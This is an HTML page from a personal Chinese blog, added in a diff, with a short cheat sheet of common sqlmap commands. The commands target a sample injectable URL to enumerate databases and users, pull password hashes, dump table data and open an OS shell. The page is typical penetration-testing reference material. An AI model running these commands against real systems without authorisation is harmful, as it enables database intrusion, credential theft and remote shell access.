@@ -1,0 +1,163 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <link rel="dns-prefetch" href="http://example.com">
+  
+  <title>sqlmap常用命令 | 熊窝</title>
+  <meta name="author" content="Bear">
+  
+  <meta name="description" content="今天是过去最好的结果">
+  
+  
+  <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+
+  <meta property="og:title" content="sqlmap常用命令"/>
+  <meta property="og:site_name" content="熊窝"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  <link rel="alternate" href="/atom.xml" title="熊窝" type="application/atom+xml">
+
+  <link rel="preload" as="style" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg">
+  <link href="https://unpkg.com" rel="dns-prefetch" />
+  <link href="https://busuanzi.ibruce.info" rel="dns-prefetch" />
+  <link href="https://cdn1.lncld.net" rel="dns-prefetch" />
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div class="container">
+    <div class="left-col" style="background-image:url('/images/social/007S8ZIlgy1ggdmi6yapmj30dw0zk0wm.jpg')">
+      <div class="intrude-less">
+        <header id="header" class="inner">
+          <a href="/">
+            <div class="profilepic"><img src='/images/social/avatar.jpg'></div>
+          </a>
+          <div class="author-name"><a href="/">Bear</a></div>
+          <p class="aboutme">今天是过去最好的结果</p>
+          <nav id="main-nav">
+            <ul class="main">
+              
+              <li>
+                
+                  <a href="/archives">归档</a>
+                
+              </li>
+              
+              <li>
+                
+                  <a href="/categories">专题</a>
+                
+              </li>
+              
+              <li>
+                
+                  <a href="/friendlinks">友链</a>
+                
+              </li>
+              
+              <li>
+                
+                  <a href="/life">关于</a>
+                
+              </li>
+              
+              <li>
+                
+                  <a href="/search">搜索</a>
+                
+              </li>
+              
+            </ul>
+          </nav>
+          <nav id="sub-nav">
+            <div class="social">
+              
+              <a class="twitter" target="_blank" rel="noopener" href="https://twitter.com/" title="Twitter">Twitter</a>
+              
+              
+              
+              <a class="github" target="_blank" rel="noopener" href="https://github.com/" title="Github">Github</a>
+              
+              
+              <a class="yuque" target="_blank" rel="noopener" href="https://yuque.com/" title="语雀">语雀</a>
+              
+
+              
+              <a class="rss" href="/atom.xml" title="RSS">RSS</a>
+              
+            </div>
+          </nav>
+        </header>
+      </div>
+    </div>
+    <div class="mid-col">
+      <div class="mid-col-container">
+        <div id="content" class="inner">
+          <article class="post">
+
+  
+    <div class="meta">
+      
+<div class="date">
+
+<time datetime="2019-10-27T15:35:38.000Z"
+      
+      data-updated="true"
+       itemprop="datePublished">
+  2019-10-27
+</time>
+
+
+
+
+
+</div>
+
+    </div>
+  
+  <h1 class="title" itemprop="name">sqlmap常用命令</h1>
+  <div class="entry-content" itemprop="articleBody">
+    
+    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本文可直接wget得到，配合tmux使用体验更佳。（文章末尾）</span><br></pre></td></tr></table></figure>
+
+<p>./sqlmap.py –h     //查看帮助信息<br> ./sqlmap.py –u “<a target="_blank" rel="noopener" href="http://www.bigesec.com/inject.asp?id=injecthere%E2%80%9D">http://www.bigesec.com/inject.asp?id=injecthere”</a>  //get注入<br> ./sqlmap.py –u “<a target="_blank" rel="noopener" href="http://www.bigesec.com/inject.asp?id=injecthere%E2%80%9D">http://www.bigesec.com/inject.asp?id=injecthere”</a> –data “DATA”//post注入<br> ./sqlmap.py –u “<a target="_blank" rel="noopener" href="http://www.bigesec.com/inject.asp?id=injecthere%E2%80%9D">http://www.bigesec.com/inject.asp?id=injecthere”</a> –cookie “COOKIE”//修改请求时的cookie<br> ./sqlmap.py –u “<a target="_blank" rel="noopener" href="http://www.bigesec.com/inject.asp?id=injecthere%E2%80%9D">http://www.bigesec.com/inject.asp?id=injecthere”</a> –dbs   //列数据库<br> ./sqlmap.py –u “<a target="_blank" rel="noopener" href="http://www.bigesec.com/inject.asp?id=injecthere%E2%80%9D">http://www.bigesec.com/inject.asp?id=injecthere”</a> –-users //列用户<br> ./sqlmap.py –u “<a target="_blank" rel="noopener" href="http://www.bigesec.com/inject.asp?id=injecthere%E2%80%9D">http://www.bigesec.com/inject.asp?id=injecthere”</a> –-passwords //获取密码hash<br> ./sqlmap.py –u “<a target="_blank" rel="noopener" href="http://www.bigesec.com/inject.asp?id=injecthere%E2%80%9D">http://www.bigesec.com/inject.asp?id=injecthere”</a> –-tables  -D DB_NAME //列DB_NAME的表<br> ./sqlmap.py –u “<a target="_blank" rel="noopener" href="http://www.bigesec.com/inject.asp?id=injecthere%E2%80%9D">http://www.bigesec.com/inject.asp?id=injecthere”</a> –-columns –T TB_NAME -D DB_NAME  //读取TB_NAME中的列<br> ./sqlmap.py –u “<a target="_blank" rel="noopener" href="http://www.bigesec.com/inject.asp?id=injecthere%E2%80%9D">http://www.bigesec.com/inject.asp?id=injecthere”</a> –-dump –C C1,C2,C3 –T TB_NAME -D DB_NAME //读字段C1,C2,C3数据<br> ./sqlmap.py –u “<a target="_blank" rel="noopener" href="http://www.bigesec.com/inject.asp?id=injecthere%E2%80%9D">http://www.bigesec.com/inject.asp?id=injecthere”</a> –-os-shell  //取得一个shell</p>
+
+  </div>
+
+</article>
+
+
+  <nav id="pagenavi">
+    
+    <a href="/2019/10/28/2019智慧树知道app-形势与政策-题目与答案/" class="prev">上一篇：2019智慧树|知道APP 形势与政策 题目与答案</a>
+    
+    
+    <a href="/2019/10/27/nmap常用命令/" class="next">下一篇：nmap常用命令</a>
+    
+  </nav>
+
+        </div>
+        
+        
+      </div>
+      <footer id="footer" class="inner">
+        © 2020 - Bear -
+        <span id="busuanzi_container_site_pv">PV <span id="busuanzi_value_site_pv"></span></span>
+        <p>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/thinkerchan/hexo-theme-greyshade">GreyShade</a></p>
+      </footer>
+    </div>
+  </div>
+  
+  <script async defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+  <script async defer src="https://s5.cnzz.com/z_stat.php?id=1276809529&web_id=1276809529"></script>
+  
+</body>
+</html>
